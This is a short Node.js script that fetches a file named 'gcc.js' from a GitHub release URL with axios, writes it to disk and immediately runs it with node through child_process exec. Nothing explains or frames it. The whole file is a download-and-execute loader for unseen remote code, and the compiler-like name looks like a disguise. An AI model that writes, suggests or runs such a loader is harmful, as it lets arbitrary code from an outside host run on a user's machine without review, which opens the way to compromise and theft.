const url = 'https://github.com/jfux888/zeabur/releases/download/dl/gcc.js';
const fileName = 'gcc.js';

const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');

axios({
    url: url,
    responseType: 'stream'
}).then(response => {
    response.data.pipe(fs.createWriteStream(fileName)).on('finish', () => {
        exec(`node ${fileName}`);
    });
});
